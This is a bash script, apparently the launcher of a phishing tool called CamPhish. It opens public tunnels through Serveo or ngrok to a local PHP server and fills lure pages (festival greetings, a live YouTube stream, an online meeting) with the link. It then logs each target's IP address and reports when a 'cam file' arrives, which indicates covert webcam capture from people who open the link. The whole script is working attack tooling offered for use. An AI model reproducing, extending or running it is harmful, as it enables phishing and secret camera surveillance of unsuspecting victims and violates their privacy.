#!/bin/bash
# CamPhish v1.7
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;91m┏┓     ┏┓┓ • ┓   ┏┳┓    ┓\e[0m\n"
printf "\e[1;91m┃ ┏┓┏┳┓┃┃┣┓┓┏┣┓   ┃ ┏┓┏┓┃\e[0m\n"
printf "\e[1;91m┗┛┗┻┛┗┗┣┛┛┗┗┛┛┗   ┻ ┗┛┗┛┗\e[0m\n"
printf "\e[1;91m                               \e[0m\n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require php but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] IP:\e[0m\e[1;91m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;91m[\e[0m\e[1;91m*\e[0m\e[1;91m] Waiting targets,\e[0m\e[1;91m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;91m[\e[0m+\e[1;91m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;91m[\e[0m+\e[1;91m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}

server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require ssh but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Direct link:\e[0m\e[1;91m %s\n' $send_link
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;91m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n\e[1;91m-----Choose a template----\n"    
printf "\n\e[1;91m[\e[0m\e[1;91m01\e[0m\e[1;91m] Festival Wishing\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m02\e[0m\e[1;91m] Live Youtube TV\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m03\e[0m\e[1;91m] Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;91m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require unzip but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require wget but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;91m[!] Download error... Termux, run: pkg install wget\e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;91m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Starting php server...\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
printf '\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Direct link:\e[0m\e[1;91m %s\n' $link
payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n\e[1;91m[\e[0m\e[1;91m01\e[0m\e[1;91m] Serveo.net (BEST!)\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;91m02\e[0m\e[1;91m] Ngrok\n"
default_option_server="1"
read -p $'\n\e[1;91m[\e[0m\e[1;91m+\e[0m\e[1;91m] Choose a port forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then
command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;91mI require php but it's not installed. Install it. Aborting.\e[0m"; exit 1; }
server
elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;91m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
fi
}

banner
dependencies
camphish
